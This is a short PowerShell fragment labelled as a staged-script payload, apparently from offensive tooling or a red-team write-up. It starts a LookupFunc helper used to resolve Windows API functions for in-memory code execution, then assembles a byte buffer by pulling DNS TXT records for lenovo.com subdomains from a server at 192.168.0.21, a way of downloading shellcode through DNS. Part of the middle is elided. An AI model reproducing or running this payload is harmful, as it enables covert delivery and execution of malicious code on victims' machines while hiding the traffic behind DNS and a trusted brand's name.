# Payload used for the staged script section
function LookupFunc {
    Param (
        $moduleName, 
        $functionName
...
[Byte[]]$buf = $((1..$((Resolve-DnsName -Name lenovo.com -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings) | % {$((Resolve-DnsName -Name $([System.String]$_+'.lenovo.com') -Type txt -Server 192.168.0.21 -DnsOnly).Strings)}) -join '') -split ','
